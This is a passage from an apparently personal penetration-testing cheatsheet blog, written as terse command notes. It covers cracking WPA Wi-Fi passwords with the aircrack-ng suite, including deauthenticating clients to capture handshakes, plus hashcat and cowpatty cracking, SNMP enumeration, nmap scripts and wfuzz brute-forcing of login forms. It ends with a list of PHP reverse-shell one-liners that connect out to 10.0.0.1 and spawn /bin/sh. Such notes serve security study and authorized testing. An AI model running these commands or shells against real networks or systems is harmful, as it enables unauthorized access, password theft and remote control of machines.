See <a href="https://www.aircrack-ng.org/doku.php?id=airodump-ng">Aircrack website</a> for more info.</p><ul><li><code>sudo airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w cap1 wlan0mon</code> <code>-w</code> outputs the file as <code>cap1</code></li></ul><h3 id=aireplay-ng>Aireplay-ng<a hidden class=anchor aria-hidden=true href=#aireplay-ng>#</a></h3><p>Generate wireless traffic. Used with Aircrack-ng to crack WEP keys</p><p>Basic Injection Test</p><ul><li>Make sure you are in the same CH as the AP <code>sudo airmon-ng start wlan0 &lt;CH#></code></li><li><code>sudo aireplay-ng -9 wlan0mon</code></li><li><code>sudo aireplay-ng -9 -e wifu -a 34:08:04:09:3D:38 wlan0mon</code> Injection test specific SSID <code>-e</code> SSID/ESSID <code>-a</code> BSSID</li></ul><h3 id=aircrack-ng>Aircrack-ng<a hidden class=anchor aria-hidden=true href=#aircrack-ng>#</a></h3><p><a href="https://www.aircrack-ng.org/doku.php?id=cracking_wpa">Nice Tut</a></p><ul><li>Put wlan0 to monitor mode</li><li><code>sudo airodump-ng wlan0mon</code> dump all wireless</li><li>List down details of our target BSSID(Mac address of AP), Station(Client connected Mac address), AUTH(PSK)</li><li>aircrack-ng does not work with Enterprise(MGT), Opportunistic Wireless Encryption(OWE) cannot be cracked yet.</li><li>use airodump again against the specific AP target <code>sudo airodump-ng -c 3 -w wpa --essid wifu --bssid 34:08:04:09:3D:38 wlan0mon</code> this will save the result to wpa.cap</li><li>Aireplay to deauth the client and capture 4-way Handshake <code>sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon</code> The <code>-0 1</code> means Deauth once.</li><li>Once client reconnects we will be able to capture a handshake</li><li>let airodump run for a bit.</li><li>Use aircrack to Crack the handshake <code>aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap</code></li><li>confirm passphrase <code>airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap</code></li></ul><p>Failed to get a handshake?</p><ul><li>Try sending deauth as broadcast. omit <code>-c</code></li><li>802.11w can&rsquo;t do anything but to wait for a client to connect.</li></ul><p>Custom Wordlist for Aircrack</p><ul><li>jtr</li><li>crunch</li><li>mangler</li></ul><p>Cracking with Hashcat</p><ul><li>convert pcap to hccapx <code>/usr/lib/hashcat-utils/cap2hccapx.bin &lt;.pcap> output.hccapx</code></li><li><code>hashcat -m 2500 output.hccapx &lt;wordlist></code></li></ul><h3 id=airolib-ng>Airolib-ng<a hidden class=anchor aria-hidden=true href=#airolib-ng>#</a></h3><p>Used to compute Pairwise Master Keys(PMK)</p><ul><li><code>echo wifu > essid.txt</code></li><li><code>airolib-ng wifu.sqlite --import essid essid.txt</code></li><li><code>airolib-ng wifu.sqlite --stat</code></li><li><code>airolib-ng wifu.sqlite --import passwd &lt;wordlist></code></li><li><code>airolib-ng wifu.sqlite --batch</code></li><li><code>aircrack-ng -r wifu.sqlite &lt;pcap></code></li></ul><h3 id=cowpatty>CoWPAtty<a hidden class=anchor aria-hidden=true href=#cowpatty>#</a></h3><p>Used for rainbow table attacks to crack WPA passphrases</p><ul><li><code>genpmk -f &lt;wordlist> -d outfile -s wifu</code> kinda like airolib</li><li><code>cowpatty -r &lt;pcap> -d &lt;outfilefromgenpmk> -s wifu</code></li></ul><h2 id=snmp>SNMP<a hidden class=anchor aria-hidden=true href=#snmp>#</a></h2><ul><li><code>snmp-check &lt;ip></code></li><li><code>snmpwalk -c public -v1 -t 10 &lt;ip></code></li><li><code>auxiliary/scanner/snmp/snmp_enum</code></li><li>black hole mode enabled? theres an RCE for SMTP</li></ul><h2 id=tools>Tools<a hidden class=anchor aria-hidden=true href=#tools>#</a></h2><h3 id=nmap>NMAP<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3><ul><li><code>-sv</code> > Service Version > used for banner grabbing</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.38
</span></span></code></pre></div><ul><li>scripts > <code>/usr/share/nmap/scripts</code></li><li><code>nmap -p80 --script=http-methods --script-args http-methods.url-path='/wp-includes/' $IP</code></li></ul><p>Safe won&rsquo;t do anything intrusive like write files on target, bruteforce, do high traffic stuff</p><h3 id=cewl>Cewl<a hidden class=anchor aria-hidden=true href=#cewl>#</a></h3><p><code>sudo cewl -d 2 -m 5 -w Wordlist.txt example.com</code></p><h3 id=wfuzz>Wfuzz<a hidden class=anchor aria-hidden=true href=#wfuzz>#</a></h3><p>parameter discovery</p><p><code>burp-parameter-names.txt</code></p><p><code>wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 "http://offsecwp:80/index.php?FUZZ=data"</code></p><p><code>wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 404 -d "log=admin&pwd=FUZZ" http://target:80/wp-login.php</code></p><p><code>wfuzz -c -z file,/home/all3n/tools/SecLists/Passwords/rockyou.txt --hw 325 -d "username=bob&password=FUZZ" -b 'PHPSESSID=2455efd8379026e261ef78186cebfc42' http://192.168.191.121/dev/index.php</code></p><ul><li>Try fuzzing for files that ends with xml aswell and anyother types txt,csv,bak etc.</li></ul><p>Vhost fuzzing</p><p><code>wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "Host: preprod-FUZZ.host.com" --hc 200 --hw 356 -t 100 10.10.10.101</code></p><h3 id=hakrawler>Hakrawler<a hidden class=anchor aria-hidden=true href=#hakrawler>#</a></h3><p>Uses The wayback Machine to gather directories.</p><h3 id=shells>Shells<a hidden class=anchor aria-hidden=true href=#shells>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>php</span> <span class=o>-</span><span class=nx>r</span> <span class=s1>&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,80);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
</span></span><span class=line><span class=cl><span class=nx>php</span> <span class=o>-</span><span class=nx>r</span> <span class=s1>&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,80);shell_exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
</span></span><span class=line><span class=cl><span class=nx>php</span> <span class=o>-</span><span class=nx>r</span> <span class=s1>&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,80);system(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
</span></span><span class=line><span class=cl><span class=nx>php</span> <span class=o>-</span><span class=nx>r</span> <span class=s1>&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,80);passthru(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
</span></span><span class=line><span class=cl><span class=nx>php</span> <span class=o>-</span><span class=nx>r</span> <span class=s1>&#39;$sock=fsockopen(&#34;10.0.0.1&#34;,80);popen(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;, &#34;r&#34;);&#39;</span>
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Notes on twitter" href="https://twitter.com/intent/tweet/?text=Notes&url=https%3a%2f%2fblog.allenxd.com%2fnotes%2f&hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Notes on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fblog.allenxd.com%2fnotes%2f&title=Notes&summary=Notes&source=https%3a%2f%2fblog.allenxd.com%2fnotes%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Notes on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fblog.allenxd.com%2fnotes%2f&title=Notes"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Notes on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.allenxd.com%2fnotes%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Notes on whatsapp" href="https://api.whatsapp.com/send?text=Notes%20-%20https%3a%2f%2fblog.allenxd.com%2fnotes%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Notes on telegram" href="https://telegram.me/share/url?text=Notes&url=https%3a%2f%2fblog.allenxd.com%2fnotes%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://blog.allenxd.com/>Hacking Cheatsheet</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>